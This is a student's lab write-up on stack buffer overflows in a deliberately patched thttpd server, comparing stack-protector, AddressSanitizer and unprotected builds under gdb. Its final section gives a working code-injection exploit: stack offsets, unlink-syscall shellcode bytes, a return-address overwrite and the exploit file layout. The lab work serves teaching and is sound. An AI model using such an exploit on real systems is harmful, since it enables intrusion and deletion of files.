@@ -1,0 +1,426 @@
+1.check the path
+I used
+export PATH=/usr/local/cs/bin:$PATH
+to add /usr/local/cs/bin to the default path. And the command "which gcc" outputs
+"/usr/local/cs/bin/gcc".
+
+---------------------------------------------------------------------------------
+2.
+I used "touch patch.diff" to create a file and copied the patch to this file.
+And I used "patch -p1 < patch.diff" to patch the thttpd.c as specified. The
+reason to use -p1 option is that I was in sthttpd-2.27.0 directory when I
+executed the command.
+The output:
+Hunk #2 succeeded at 1012 with fuzz 1
+shows that it successfully patch the source file.
+
+Then I used ./configure LDFLAGS="-Xlinker --rpath=/usr/local/cs/gcc-$(gcc -dumpversion)/lib"
+to configure the environment. To build these three files, I used:
+make clean
+make CFLAGS='-g3 -O2 -fno-inline -fstack-protector-strong'
+mv src/thttpd src/thttpd-sp
+
+make clean
+make CFLAGS='-g3 -O2 -fno-inline -static-libasan -fsanitize=address'
+mv src/thttpd src/thttpd-as
+
+make clean
+make CFLAGS='-g3 -O2 -fno-inline -fno-stack-protector -zexecstack'
+mv src/thttpd src/thttpd-no
+
+As discussed on piazza, I encountered the same  program when testing the normal
+case for thttpd-as.
+The error is "error while loading shared libraries: libasan.so.3: wrong ELF class: ELFCLASS32"
+
+So I added -static-libasan option when compiling thttpd-as
+
+
+and now there are three files named thttpd-as thttpd-sp and thttpd-no in src directory.
+
+---------------------------------------------------------------------------------
+3.4.Run each of the three daemons and verify they work in normal cases
+
+Since my UID is 704797256, so I should run on port 12670, 12671, 12672 for my
+three daemons respectively. Then I use
+gdb src/thttpd-sp
+run -p 12670 -D
+
+gdb src/thttpd-as
+run -p 12671 -D
+
+gdb src/thttpd-no
+run -p 12672 -D
+
+to run them with gdb.
+
+I opened another terminal and created a file named foo.txt
+and use 
+curl http://localhost:12670/foo.txt
+curl http://localhost:12671/foo.txt
+curl http://localhost:12672/foo.txt
+
+to test the normal cases.
+
+And the output is exactly what inside foo.txt.
+
+---------------------------------------------------------------------------------
+5.make SP version crash
+I create a file named config.txt with"dir=(MORE THAN 100 RANDOM CHARACTERS)" in it,
+and run on gdb with -p 12670 -D -C config.txt. The thttpd crashed and the output is:
+
+Program received signal SIGSEGV, Segmentation fault.
+0x00007ffff6db3118 in ?? () from /lib64/libgcc_s.so.1
+
+
+I use "bt" command to get a traceback, it looks like this:
+#0  0x00007ffff6db3118 in ?? () from /lib64/libgcc_s.so.1
+#1  0x00007ffff6db4019 in _Unwind_Backtrace () from /lib64/libgcc_s.so.1
+#2  0x00007ffff76e8636 in backtrace () from /lib64/libc.so.6
+#3  0x00007ffff7651f24 in __libc_message () from /lib64/libc.so.6
+#4  0x00007ffff76ec047 in __fortify_fail () from /lib64/libc.so.6
+#5  0x00007ffff76ec010 in __stack_chk_fail () from /lib64/libc.so.6
+#6  0x0000000000405056 in read_config (filename=<optimized out>)
+    at thttpd.c:1190
+#7  0x666864736b7a6b7a in ?? ()
+#8  0x7373737373737373 in ?? ()
+#9  0x7373737373737373 in ?? ()
+#10 0x6661736664737373 in ?? ()
+#11 0x6a736b6c64647361 in ?? ()
+#12 0x006c736b6a666f7a in ?? ()
+#13 0x0000000000000000 in ?? ()
+
+So we can see that function at 0x00007ffff6db3118 is overwritten by the content
+in configure.txt
+
+I use set disassemble-next-line on to check the machine instruction.
+Since the program is aborted at thttpd.c:1190, which can be seen from backtrace,
+I set a breakpoint there with the command "break thttpd.c:1190". Then I use
+"si" to step through the machine instructions.
+
+Apparently, when the program is executing this line:
+
+0x0000000000404f31 <read_config+1233>:       0f 85 1a 01 00 00       jne    0x\
+405051 <read_config+1521>
+
+it is checking whether the canary value has been modified. And since the next instruction is:
+
+0x0000000000405051 <read_config+1521>:       e8 5a d4 ff ff  callq  0x4024b0 <\
+__stack_chk_fail@plt>
+
+The canary value has been altered and the program jumped to 0x405051 and called a function named
+__stack_chk_fail to perform error handling,  which cause the program to crash.
+
+To sum up, the single line in config.txt contains more than 100 characters
+and it is stored in an array that is only 100 bytes long.
+With fstack-protector-stong, canary value is set on the stack of the function.
+At the end of the function, before the function returns, the program will check
+the canary value. If the stack is overflowed and the canary value is modified,
+the jne instruction will jump to __stack_chk_fail to indicate the overflow situation.
+
+---------------------------------------------------------------------------------
+
+6. make AS crash
+I rewrited configure.txt to contain "port=12671 port=12671 port=12671... port=12671" so that the total characters exceed 100 characters. Then I use
+"gdb thttpd-as" and "r -p 12671 -D -C configure.txt" to make it crash, and the
+output is:
+
+==6304==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7fffffffce54 at pc 0x00000043af19 bp 0x7fffffffcdb0 sp 0x7fffffffc560
+READ of size 243 at 0x7fffffffce54 thread T0
+
+Program received signal SIGSEGV, Segmentation fault.
+0x00007ffff7075118 in ?? () from /lib64/libgcc_s.so.1
+
+and the bactrace using "bt" command is:
+
+#0  0x00007ffff7075118 in ?? () from /lib64/libgcc_s.so.1
+#1  0x00007ffff7076019 in _Unwind_Backtrace () from /lib64/libgcc_s.so.1
+#2  0x00000000004b8b33 in __sanitizer::BufferedStackTrace::SlowUnwindStack (
+    this=0x7fffffffbcd0, pc=4435737, max_depth=<optimized out>)
+    at ../../../../gcc-6.3.0/libsanitizer/sanitizer_common/sanitizer_unwind_linux_libcdep.cc:113
+#3  0x00000000004b4331 in GetStackTraceWithPcBpAndContext (fast=false,
+    context=0x0, bp=140737488342448, pc=4435737, max_depth=256,
+    stack=0x7fffffffbcd0)
+    at ../../../../gcc-6.3.0/libsanitizer/asan/asan_stack.h:49
+#4  __asan::ReportGenericError (pc=<optimized out>, bp=bp@entry=140737488342448,
+    sp=sp@entry=140737488340320, addr=addr@entry=140737488342612,
+    is_write=is_write@entry=false, access_size=access_size@entry=243,
+    exp=<optimized out>, fatal=<optimized out>)
+    at ../../../../gcc-6.3.0/libsanitizer/asan/asan_report.cc:1092
+#5  0x000000000043af34 in __interceptor_strchr (str=<optimized out>,
+    c=<optimized out>)
+    at ../../../../gcc-6.3.0/libsanitizer/asan/asan_interceptors.cc:468
+#6  0x00000000004e0ba1 in read_config (filename=<optimized out>) at thttpd.c:1018
+#7  0x74726f7020313736 in ?? ()
+#8  0x702031373632313d in ?? ()
+#9  0x373632313d74726f in ?? ()
+#10 0x00007fffff000a31 in ?? ()
+#11 0x00007fffffffd090 in ?? ()
+#12 0x0000000000000006 in ?? ()
+#13 0x00000000004082e8 in main (argc=826111090, argv=<optimized out>)
+    at thttpd.c:380
+
+I used "set disassemble-next-line on" to see the machine instructions set a
+break point atthttpd.c:1018 and use si to execute those instructions.
+The last three instructions before checking bad memory access are:
+
+ 0x00000000004e0b93 <read_config+179>:        48 8b 3c 24     mov    (%rsp),%rdi
+   0x00000000004e0b97 <read_config+183>:        be 23 00 00 00  mov    $0x23,%esi
+   0x00000000004e0b9c <read_config+188>:        e8 2f a5 f5 ff  callq  0x43b0d0 <__interceptor_strchr(char const*, int)>
+
+So the mov (%rsp),%rdi moves the stack pointer to %rdi and pass it as argument
+to __interceptor_strchr(char const*, int) to check bad memory access.
+
+
+To sum up, the program crashes right after it accesses the memory it is not supposed to
+access rather than at the end of the execution of the function. The reason for
+this behavior is that fsanitize=address will put "poisoned redzone" around
+the stack buffer(the intended data structure, in this case the 100-byte array).
+Every time when the program tries to access memory on stack, it will check
+whether the region is "poisoned" or not. And if it is poisoned, the program will
+crash and report stack buffer overflow immediately.
+
+---------------------------------------------------------------------------------
+7. make NO crash
+I use gdb "thttp-no" and "r -p 12672 -D -C configure.txt" to run the server.
+And it crashes as indicated by the output:
+
+Program received signal SIGSEGV, Segmentation fault.
+0x0000000000404d9f in read_config (filename=<optimized out>) at thttpd.c:1190
+
+And the backtrace is:
+
+#0  0x0000000000404d9f in read_config (filename=<optimized out>) at thttpd.c:1190
+#1  0x310074726f700031 in ?? ()
+#2  0x726f700031373632 in ?? ()
+#3  0x0031373632310074 in ?? ()
+#4  0x3632310074726f70 in ?? ()
+#5  0x0074726f70003137 in ?? ()
+#6  0x6f70003137363231 in ?? ()
+#7  0x3137363231007472 in ?? ()
+#8  0x32310074726f7000 in ?? ()
+#9  0x74726f7000313736 in ?? ()
+#10 0x7000313736323100 in ?? ()
+#11 0x373632310074726f in ?? ()
+#12 0x0000000000000031 in ?? ()
+#13 0x0000000000000000 in ?? ()
+
+So I set a breakpoint by "break thttpd.c:1190", and use si to step through the instructions. The last chunks of machine instructions are:
+
+   0x0000000000404d93 <read_config+1203>:       48 83 c4 70     add    $0x70,%rsp
+   0x0000000000404d97 <read_config+1207>:       5b      pop    %rbx
+   0x0000000000404d98 <read_config+1208>:       5d      pop    %rbp
+   0x0000000000404d99 <read_config+1209>:       41 5c   pop    %r12
+   0x0000000000404d9b <read_config+1211>:       41 5d   pop    %r13
+   0x0000000000404d9d <read_config+1213>:       41 5e   pop    %r14
+=> 0x0000000000404d9f <read_config+1215>:       c3      retq
+
+and the instruction that causes the program to crash is:
+
+0x0000000000404d9f <read_config+1215>:       c3      retq
+
+The reason for the crash is that configure.txt exceeds 100
+characters within a single line, and the content of it overwrites the return
+address of the function that calls read_config. With -zexecstack, the stack
+should be executable. But in this case, when read_config returns, it returns to
+a memory location specified by whatever wrote onto the stack location by
+configure.txt, which is happen to be non-executable. So the crash occurs.
+
+---------------------------------------------------------------------------------
+
+8.generate assembly language code
+
+I use
+
+make clean
+gcc -S -O2 -fno-inline -fstack-protector-strong -I .. -I . thttpd.c -o thttpd-sp.s 
+
+make clean
+gcc -S -O2 -fno-inline -fsanitize=address  -I .. -I . thttpd.c  -o thttpd-as.s
+
+make clean
+gcc -S -O2 -fno-inline -fno-stack-protector -zexecstack  -I .. -I . thttpd.c  -o thttpd-no.s
+
+to generate these three assembly files.
+
+And I put these three handle_read function into read-sp.s, read-as.s and
+ read-no.s respectively. Then use:
+
+diff read-sp.s read-as.s > sp-as.diff 
+diff read-sp.s read-no.s > sp-no.diff 
+diff read-as.s read-no.s > as-no.diff
+
+to compare the difference between these three functions. I found that
+the handle_read functions in SP version and NO version do not have essential
+difference. The only difference is the label numbers. This makes sense since
+the fstack-protector-strong only checks canary value at the end of functions,
+just before they return. So in handle_read fucntion, they do not have difference.
+I further confirmed my thought via checking that every call to __stack_chk_fail
+function in SP version is executed right before the ret instruction. Since
+__stack_chk_fail is the only mechanism used by fstack-protector-strong,
+handle_read function basically has no difference in NO and SP version.
+
+However, the handle_read function in AS version is much longer than NO and SP
+version. This is because AS checks whether memory access is valid every time
+when the program tries to access memory on stack.
+
+techniques used:
+
+-fstack-protector-strong adds a canary value on function's stack, and check if
+the canary value has been changed before return. If the canary value is altered,
+program will crash.
+
+-fsanitize=address put "poisoned redzones" around all valid addresses on stack. 
+It maps the application memory to shadow memory and denotes all the "poisoned
+redzones" in shadow memory. If the function is accessing the poisoned redzone,
+the program will crash.
+
+For example, in AS's handle_read:
+
+movq    %rdi, %rax 
+shrq    $3, %rax
+cmpb    $0, 2147450880(%rax)
+ jne     .L1175
+
+These commands are mapping from the current address on stack to the shadow
+memory and check whether the address is poisoned(0 if no byte is poisoned).
+If it is poisoned, jump to .L1175, which is error handling:
+
+.L1175:
+        call    __asan_report_load8
+
+Similarly,
+	 call    __asan_report_load4
+	 call    __asan_report_store8 
+
+are all error handling for accessing "redzone" regions on stack.
+
+---------------------------------------------------------------------------------
+
+9. Exploit
+
+I use gdb thttpd-no to run NO version on gdb.
+And use "set disassemble-next-line on" to see the machine instructions and their
+addresses. 
+
+Then I set a break point by "break read_config" and run httpd-no using:
+r -p 12671 -D -C config.txt. 
+
+After the program stops at the breakpoint, I use "i r $rsp" to see the current
+memory location the stack pointer points to, which should be the location that
+stores the return address of the calling function. The output is:
+
+rsp            0x7fffffffcfe8   0x7fffffffcfe8
+
+I use si command to step through the instructions. After executing the instruction:
+
+=> 0x00000000004048f0 <read_config+16>: 48 83 ec 70     sub    $0x70,%rsp
+
+I use "print &line" to see the start location of char line[100], which is
+
+$1 = (char (*)[100]) 0x7fffffffcf50
+
+The above line shows that line array starts at 0x7fffffffcf50. 
+
+So the difference between these two address is 
+   0x7fffffffcfe8 - 0x7fffffffcf50 = 0x98(152 in decimal)
+
+Then I wrote a program test.c to find the hex representation of "target.txt":
+
+#include<stdio.h>
+
+int main(void)
+
+{
+  char name[11] = "target.txt";
+  return 0;
+}
+
+use gcc -c test
+and objdump -d test.o, the output is:
+
+   0:	55                   	push   %rbp
+   1:	48 89 e5             	mov    %rsp,%rbp
+   4:	48 b8 74 61 72 67 65 	movabs $0x742e746567726174,%rax
+   b:	74 2e 74 
+   e:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
+  12:	66 c7 45 f8 78 74    	movw   $0x7478,-0x8(%rbp)
+  18:	c6 45 fa 00          	movb   $0x0,-0x6(%rbp)
+  1c:	b8 00 00 00 00       	mov    $0x0,%eax
+  21:	5d                   	pop    %rbp
+  22:	c3                   	retq   
+
+
+which shows that the hex bytes of "target.txt" is 74 61 72 67 65 74 2e 74 78 74 00
+(little endian)
+
+Basically I need to inject code to delete the file target.txt. And it is the
+kind of tasks that only OS can do. So I need to use syscall to perform the task.
+Since the unlink() system call requires (char* path) as parameter, 
+I need to store"target.txt" on stack to give it an address. I put it just below 
+the return address. So the address of "target.txt" would be
+
+    0x7fffffffcfe8 - 16 = 0x7fffffffcfd8
+
+Since the system call number for unlink in x86-64 is 87,so I wrote a assembly 
+file del.s to obtain the bytecode I need to inject into the stack:
+
+movq $87, %rax        # defines which systemcall we are using (87th)
+movq $0x7fffffffcfd8, %rdi     #specify the path to "target.txt"
+syscall
+
+use gcc -c del.s  then  objdump -d del.o, the output is:
+
+0:	48 c7 c0 57 00 00 00 	mov    $0x57,%rax
+7:	48 bf d8 cf ff ff ff 	movabs $0x7fffffffcfd8,%rdi
+e:	7f 00 00 
+11:	0f 05                	syscall 
+
+So the hex byte I need to inject should be:
+
+48 c7 c0 57 00 00 00 48 bf d8 cf ff ff ff 7f 00 00 0f 05 for executable code
+
+and
+
+74 61 72 67 65 74 2e 74 78 74 00 00 00 00 00 00 for "target.txt"
+
+Since I need to add"port=" at the beginning of exploit.txt to make -C option 
+run normally, the return address would be 0x7fffffffcf50 + 5 = 0x7fffffffcf55
+The hex bytes for return address are:
+
+55 cf ff ff ff 7f 00 00     (the trailing 00 are used for 16-alignment)
+
+So there need to have 152-16-5-19 = 112 extra bytes.
+
+The exploit.txt should look like:
+
+port=48 c7 c0 57 00 00 00 48 bf d8 cf ff ff ff 7f 00 00 0f 05
+(00 repeated 112 times) 
+74 61 72 67 65 74 2e 74 78 74 00 00 00 00 00 00
+55 cf ff ff ff 7f 00 00
+
+The last problem remaining is to change the hex bytes to binary format so that
+fgets() can actually read in the hex bytes rather than a character at a time.
+I use the tool posted on piazza
+
+ http://tomeko.net/online_tools/hex_to_file.php?lang=en  
+
+to convert it and append the binary code to "port=" in exploit.txt
+
+After finishing this step, I use "touch target.txt" to create target.txt in the
+current directory. Then I run thttp-no in gdb with "r -p 12672 -D -C exploit.txt"
+and the output shows:
+
+Program received signal SIGSEGV, Segmentation fault.
+0x00007fffffffcf68 in ?? ()
+
+The output makes sense since after executing my injected code, the server has no
+to executable instructions in following stack location. 
+
+I use "find -name target.txt"  to check and find that "target.txt" has been deleted.
+
+So, as a result, the exploitation is successful, but only in the case that
+ASRL/Stack randomization is closed. If ASRL is on, there can have 2^N random
+offset applied to positioning. And we cannot exploit the bug in NO version with
+our current knowldge. 
+
+PS: The injectCode.txt is also submitted. It contains the hex bytes injected to stack.
